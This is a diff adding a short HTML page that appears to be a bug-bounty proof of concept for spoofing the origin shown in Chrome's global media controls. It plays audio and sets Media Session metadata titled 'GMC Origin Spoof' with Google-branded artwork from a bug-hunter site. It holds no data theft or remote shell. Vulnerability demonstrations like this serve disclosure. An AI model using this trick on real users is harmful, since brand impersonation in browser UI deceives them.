@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Global Media Control Trigger</title>
+</head>
+<body>
+
+<button id="play">Play Media</button>
+
+<audio id="audio" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
+
+<script>
+const audio = document.getElementById("audio");
+
+document.getElementById("play").onclick = async () => {
+  await audio.play();
+
+  if ("mediaSession" in navigator) {
+    navigator.mediaSession.metadata = new MediaMetadata({
+      title: "GMC Origin Spoof",
+      artist: "severus",
+      album: "Chrome Spoof ",
+      artwork: [{
+        src: "https://bughunter-6.github.io/yen/google.png",
+        sizes: "512x512",
+        type: "image/png"
+      }]
+    });
+
+    navigator.mediaSession.setActionHandler("play", () => audio.play());
+    navigator.mediaSession.setActionHandler("pause", () => audio.pause());
+    navigator.mediaSession.setActionHandler("seekbackward", e => {
+      audio.currentTime -= e.seekOffset || 10;
+    });
+    navigator.mediaSession.setActionHandler("seekforward", e => {
+      audio.currentTime += e.seekOffset || 10;
+    });
+  }
+};
+</script>
+
+</body>
+</html>
